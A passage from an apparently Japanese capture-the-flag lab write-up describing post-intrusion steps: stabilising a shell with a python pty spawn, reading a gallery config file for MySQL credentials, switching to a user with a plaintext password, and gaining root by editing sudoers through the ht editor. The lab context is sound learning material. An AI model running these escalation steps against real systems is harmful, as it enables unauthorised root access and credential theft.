## 侵入後
シェルの安定化を行い、ディレクトリを探してみるとgalleryがあったので中を確認してみたところ、configがあったので確認してみたところMySQLへの接続情報を見つけました。
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo;fg
cd gallery
cat gconfig.php
```
{% include image.html file="gconfig.png" %}

取得していたユーザーで切り替え
```bash
su loneferret
Password: starwars
```
{% include image.html file="su.png" %}

その後、htというファイルエディタを見つけたので /bin/bashを編集してroot権限獲得です。
```bash
sudo -l
sudo ht
loneferret ALL=(ALL) ALL
sudo /bin/bash
id
```
